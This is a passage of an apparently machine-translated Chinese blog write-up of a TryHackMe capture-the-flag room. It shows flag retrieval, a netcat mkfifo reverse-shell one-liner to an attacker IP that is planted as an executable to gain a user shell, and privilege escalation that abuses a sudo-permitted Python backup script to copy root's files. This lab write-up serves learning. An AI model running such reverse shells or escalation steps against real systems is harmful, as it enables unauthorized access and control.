~/flag.txt &gt; /home/files/yash.txt</span><span id="a793" class="mk ky it mg b gy nb mm l mn mo"># cat ~/yash.txt<br/>THM{c296539f3286a89XXXXXXXXXXXXXXXXX}</span></pre><p id="4b7b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们发现了第一面旗帜。继续找根旗。记住，消息文本框实际上过滤了某些命令。我们检查一下源代码怎么样？</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="f945" class="mk ky it mg b gy ml mm l mn mo">cat * &gt; /home/files/yash.txt</span></pre><p id="5ff7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">从源代码pentest.php，</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi nh"><img src="../Images/9885877be81e58be364e12467c29efa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EmwWmgq3AueUlrghAt8-PQ.png"/></div></div></figure><p id="20aa" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">所以我们不能从页面运行反向shell。由于我们有访问用户“文件”的权限，创建一个包含反向外壳的可执行外壳</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="f2d2" class="mk ky it mg b gy ml mm l mn mo"># echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.X.X 1993 &gt;/tmp/f" &gt; ~/givemeaccess<br/># chmod +x ~/givemeaccess<br/># chmod 777 ~/givemeaccess</span></pre><p id="4b43" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">通过请求发送<code class="fe mu mv mw mg b">/home/files/givemeaccess</code>，现在我们获得了对<code class="fe mu mv mw mg b">yash</code>用户的访问权。快速检查权限，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="2ee5" class="mk ky it mg b gy ml mm l mn mo"># sudo -l<br/>Matching Defaults entries for yash on safezone:</span><span id="d152" class="mk ky it mg b gy nb mm l mn mo">env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass</span><span id="adac" class="mk ky it mg b gy nb mm l mn mo">User yash may run the following commands on safezone:</span><span id="a07e" class="mk ky it mg b gy nb mm l mn mo">(root) NOPASSWD: /usr/bin/python3 /root/bk.py</span></pre><p id="e4bc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">为python运行sudo只针对文件bk.py，让我们试试吧，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="9ea1" class="mk ky it mg b gy ml mm l mn mo">sudo python3 /root/bk.py<br/>Enter filename: /root/*<br/>Enter destination: /home/yash/testing/<br/>Enter password: abcd</span></pre><p id="9ed6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们看看，</p><pre class="kp kq kr ks gt mf mg mh mi aw mj bi"><span id="0228" class="mk ky it mg b gy ml mm l mn mo"># ls -al ~/testing<br/>-rwxr-xr-x 1 root root  336 Jun  6 20:28 <strong class="mg iu">bk.py<br/></strong>-rw-r--r-- 1 root root  462 Jun  6 20:28 login.html<br/>-rw-r--r-- 1 root root  578 Jun  6 20:28 login.js<br/>-rw-r--r-- 1 root root  813 Jun  6 20:28 pentest.php<br/><strong class="mg iu">-rw-r--r-- 1 root root   38 Jun  6 20:28 root.txt</strong></span></pre><p id="2823" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在我们找到了最后的旗帜！。</p></div><div class="ab cl ni nj hx nk" role="separator"><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn no"/><span class="nl bw bk nm nn"/></div><div class="im in io ip iq"><p id="2d7c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这个房间相当棘手。大量的尝试和错误。无论如何，感谢你的阅读，让我们来看看另一篇文章。🤘</p></div></div>    
</body>
</html>